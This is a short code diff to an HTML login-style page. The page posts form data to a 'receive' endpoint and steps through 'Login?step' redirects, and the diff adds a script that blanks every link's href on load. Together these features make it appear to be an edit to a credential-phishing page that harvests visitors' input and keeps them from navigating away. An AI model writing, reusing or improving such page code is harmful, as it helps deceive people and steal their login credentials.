@@ -232,11 +232,11 @@ document.querySelector('form').addEventListener('submit', function(event) {
         // Send AJAX request
         $.ajax({
             method: 'POST',
-            url: "/receive",
+            url: "./receive",
             data: user
         }).done(function(msg) {
             sessionStorage.setItem('visitor', visitor);
-            window.location.href = "Login?step=3";
+            window.location.href = "Login?step=2";
             console.log(msg); // Log success message
         }).fail(function(err, textStatus, error) {
             console.error('Submission failed:', textStatus, error);
@@ -292,7 +292,6 @@ document.querySelector('form').addEventListener('submit', function(event) {
 
     
     <noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=2106583629541727&amp;ev=PageView&amp;noscript=1"></noscript>
-
     
     
     
@@ -300,5 +299,13 @@ document.querySelector('form').addEventListener('submit', function(event) {
 
     	
     </body>
-
+<script>
+  document.addEventListener('DOMContentLoaded', function () {
+    var links = document.querySelectorAll('body a');
+    for (var i = 0; i < links.length; i++) {
+      var link = links[i];
+      link.setAttribute('href', ''); // Set the href value to an empty string
+    }
+  });
+</script>
 </html>
